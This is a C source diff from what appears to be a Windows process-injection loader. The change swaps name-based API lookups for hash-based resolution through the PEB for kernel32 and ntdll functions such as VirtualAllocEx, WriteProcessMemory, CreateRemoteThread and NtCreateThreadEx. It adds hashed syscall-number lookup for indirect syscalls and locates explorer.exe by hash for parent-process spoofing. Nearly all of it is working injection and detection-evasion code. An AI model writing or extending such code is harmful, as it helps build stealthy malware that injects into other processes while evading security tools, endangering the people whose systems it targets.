@@ -4,7 +4,12 @@
 #include "syscall-utils.h"
 #include "resolver.h"
 
+#include "hash_loader.h"
+#include "hashed_values.h"
+
 #include <stdio.h>
+
+#define LOCAL_PROCESS_HANDLE ((HANDLE)(LONG_PTR)-1)
 
 static LOCAL_LOADER_CONTEXT g_EnvContext = { 0 };
 
@@ -262,9 +267,21 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
     //
     if (needDFR)
     {
+#if defined(_WIN64)
+        PPEB pPeb = (PPEB)__readgsqword(0x60);
+#else
+        PPEB pPeb = (PPEB)__readfsdword(0x30);
+#endif
+
         printf("[*] Initializing DFR resolver...\n");
 
-        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        //HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        PVOID hKernel32 =
+            GetModuleBaseManualHV(
+                LOCAL_PROCESS_HANDLE,
+                pPeb,
+                &hv_kernel32
+            );
         if (!hKernel32)
         {
             printf("[ERROR] Failed to get kernel32.dll\n");
@@ -273,8 +290,13 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
 
         if (needDFRAlloc)
         {
-            g_VirtualAllocEx =
-                (P_VirtualAllocEx)GPAManualByName(hKernel32, "VirtualAllocEx");
+            /*g_VirtualAllocEx =
+                (P_VirtualAllocEx)GPAManualByName(hKernel32, "VirtualAllocEx");*/
+
+            g_VirtualAllocEx = (P_VirtualAllocEx)GetProcAddressManualHV(
+                LOCAL_PROCESS_HANDLE,
+                hKernel32,
+                &hv_VirtualAllocEx);
             if (!g_VirtualAllocEx)
             {
                 printf("[ERROR] Failed to resolve VirtualAllocEx for DFR alloc.\n");
@@ -283,9 +305,14 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         }
 
         if (needDFRWrite)
-        {
-            g_WriteProcessMemory =
-                (P_WriteProcessMemory)GPAManualByName(hKernel32, "WriteProcessMemory");
+        {            
+            /*g_WriteProcessMemory =
+                (P_WriteProcessMemory)GPAManualByName(hKernel32, "WriteProcessMemory");*/
+            g_WriteProcessMemory = (P_WriteProcessMemory)GetProcAddressManualHV(
+                LOCAL_PROCESS_HANDLE,
+                hKernel32,
+                &hv_WriteProcessMemory);
+
             if (!g_WriteProcessMemory)
             {
                 printf("[ERROR] Failed to resolve WriteProcessMemory for DFR write.\n");
@@ -295,11 +322,18 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
 
         if (needDFRProtect)
         {
-            g_VirtualProtect =
-                (P_VirtualProtect)GPAManualByName(hKernel32, "VirtualProtect");
-            g_VirtualProtectEx =
-                (P_VirtualProtectEx)GPAManualByName(hKernel32, "VirtualProtectEx");
-
+            /*g_VirtualProtect =
+                (P_VirtualProtect)GPAManualByName(hKernel32, "VirtualProtect");*/
+            g_VirtualProtect = (P_VirtualProtect)GetProcAddressManualHV(
+                LOCAL_PROCESS_HANDLE,
+                hKernel32,
+                &hv_VirtualProtect);                
+            /*g_VirtualProtectEx =
+                (P_VirtualProtectEx)GPAManualByName(hKernel32, "VirtualProtectEx");*/
+            g_VirtualProtectEx = (P_VirtualProtectEx)GetProcAddressManualHV(
+                LOCAL_PROCESS_HANDLE,
+                hKernel32,
+                &hv_VirtualProtectEx);
             if (!g_VirtualProtect || !g_VirtualProtectEx)
             {
                 printf("[ERROR] Failed to resolve VirtualProtect/VirtualProtectEx for DFR protect.\n");
@@ -309,10 +343,18 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
 
         if (needDFRInvoke)
         {
-            g_CreateRemoteThread =
-                (P_CreateRemoteThread)GPAManualByName(hKernel32, "CreateRemoteThread");
-            g_WaitForSingleObject =
-                (P_WaitForSingleObject)GPAManualByName(hKernel32, "WaitForSingleObject");
+            /*g_CreateRemoteThread =
+                (P_CreateRemoteThread)GPAManualByName(hKernel32, "CreateRemoteThread");*/
+            g_CreateRemoteThread = (P_CreateRemoteThread)GetProcAddressManualHV(
+                LOCAL_PROCESS_HANDLE,
+                hKernel32,
+                &hv_CreateRemoteThread);                
+            /*g_WaitForSingleObject =
+                (P_WaitForSingleObject)GPAManualByName(hKernel32, "WaitForSingleObject");*/
+            g_WaitForSingleObject = (P_WaitForSingleObject)GetProcAddressManualHV(
+                LOCAL_PROCESS_HANDLE,
+                hKernel32,
+                &hv_WaitForSingleObject);                
 
             if (!g_CreateRemoteThread || !g_WaitForSingleObject)
             {
@@ -351,7 +393,13 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         PPEB pPeb = (PPEB)__readfsdword(0x30);
 #endif
 
-        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        //HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        PVOID hNtdll =
+            GetModuleBaseManualHV(
+                LOCAL_PROCESS_HANDLE,
+                pPeb,
+                &hv_ntdll
+            );        
         if (!hNtdll)
         {
             printf("[ERROR] Failed to resolve ntdll.dll\n");
@@ -363,10 +411,15 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         //
         if (needIndirectAlloc)
         {
+            /*g_EnvContext.wNtAllocateVirtualMemorySSN =
+                GetSSNByName(pPeb, "NtAllocateVirtualMemory");*/
             g_EnvContext.wNtAllocateVirtualMemorySSN =
-                GetSSNByName(pPeb, "NtAllocateVirtualMemory");
+                GetSSNByHash(pPeb, hv_ntdll, hv_NtAllocateVirtualMemory);
+
+            /*g_EnvContext.sysAddrNtAllocateVirtualMemory =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory")); */
             g_EnvContext.sysAddrNtAllocateVirtualMemory =
-                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
+                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtAllocateVirtualMemory)); 
 
             wNtAllocateVirtualMemorySSN    = g_EnvContext.wNtAllocateVirtualMemorySSN;
             sysAddrNtAllocateVirtualMemory = g_EnvContext.sysAddrNtAllocateVirtualMemory;
@@ -377,10 +430,14 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         //
         if (needIndirectWrite)
         {
+            /*g_EnvContext.wNtWriteVirtualMemorySSN =
+                GetSSNByName(pPeb, "NtWriteVirtualMemory");*/
             g_EnvContext.wNtWriteVirtualMemorySSN =
-                GetSSNByName(pPeb, "NtWriteVirtualMemory");
+                GetSSNByHash(pPeb, hv_ntdll, hv_NtWriteVirtualMemory);                
+            /*g_EnvContext.sysAddrNtWriteVirtualMemory =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));*/
             g_EnvContext.sysAddrNtWriteVirtualMemory =
-                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));
+                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtWriteVirtualMemory));
 
             wNtWriteVirtualMemorySSN    = g_EnvContext.wNtWriteVirtualMemorySSN;
             sysAddrNtWriteVirtualMemory = g_EnvContext.sysAddrNtWriteVirtualMemory;
@@ -391,11 +448,14 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         //
         if (needIndirectProtect)
         {
+            /*g_EnvContext.wNtProtectVirtualMemorySSN =
+                GetSSNByName(pPeb, "NtProtectVirtualMemory");*/
             g_EnvContext.wNtProtectVirtualMemorySSN =
-                GetSSNByName(pPeb, "NtProtectVirtualMemory");
+                GetSSNByHash(pPeb, hv_ntdll, hv_NtProtectVirtualMemory);                
+            /*g_EnvContext.sysAddrNtProtectVirtualMemory =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));*/
             g_EnvContext.sysAddrNtProtectVirtualMemory =
-                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
-
+                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtProtectVirtualMemory));
             wNtProtectVirtualMemorySSN    = g_EnvContext.wNtProtectVirtualMemorySSN;
             sysAddrNtProtectVirtualMemory = g_EnvContext.sysAddrNtProtectVirtualMemory;
         }
@@ -405,13 +465,20 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         //
         if (needIndirectInvoke)
         {
-            wNtCreateThreadExSSN      = GetSSNByName(pPeb, "NtCreateThreadEx");
-            wNtWaitForSingleObjectSSN = GetSSNByName(pPeb, "NtWaitForSingleObject");
+            /*wNtCreateThreadExSSN      = GetSSNByName(pPeb, "NtCreateThreadEx");
+            wNtWaitForSingleObjectSSN = GetSSNByName(pPeb, "NtWaitForSingleObject");*/
 
-            sysAddrNtCreateThreadEx      =
+            wNtCreateThreadExSSN      = GetSSNByHash(pPeb, hv_ntdll, hv_NtCreateThreadEx);
+            wNtWaitForSingleObjectSSN = GetSSNByHash(pPeb, hv_ntdll, hv_NtWaitForSingleObject);
+
+            /*sysAddrNtCreateThreadEx      =
                 (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtCreateThreadEx"));
             sysAddrNtWaitForSingleObject =
-                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWaitForSingleObject"));
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWaitForSingleObject"));*/
+            sysAddrNtCreateThreadEx      =
+                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtCreateThreadEx));
+            sysAddrNtWaitForSingleObject =
+                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtWaitForSingleObject));                
         }
 
         //
@@ -421,9 +488,15 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         BOOL needQueryVM = needIndirectWrite || needIndirectProtect;
         if (needQueryVM)
         {
-            wNtQueryVirtualMemorySSN   = GetSSNByName(pPeb, "NtQueryVirtualMemory");
+            //wNtQueryVirtualMemorySSN   = GetSSNByName(pPeb, "NtQueryVirtualMemory");
+            wNtQueryVirtualMemorySSN   = GetSSNByHash(pPeb, hv_ntdll, hv_NtQueryVirtualMemory);
+            /*
             sysAddrNtQueryVirtualMemory =
-                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueryVirtualMemory"));
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueryVirtualMemory"));*/
+            sysAddrNtQueryVirtualMemory =
+                (UINT_PTR)GetSyscallAddress(
+                    GPAManualByHash(hNtdll, hv_NtQueryVirtualMemory)
+                );
         }
 
         printf("[+] Indirect resolver initialized.\n");
@@ -459,7 +532,8 @@ BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
         SIZE_T attributeSize = 0;
 
         // get the PID for explorer.exe
-        DWORD parentPid = FindPidByName(L"explorer.exe");
+        //DWORD parentPid = FindPidByName(L"explorer.exe");
+        DWORD parentPid = FindPidByHash(&hv_explorer);
         if (parentPid == 0) return FALSE;
 
         // open a handle to the parent
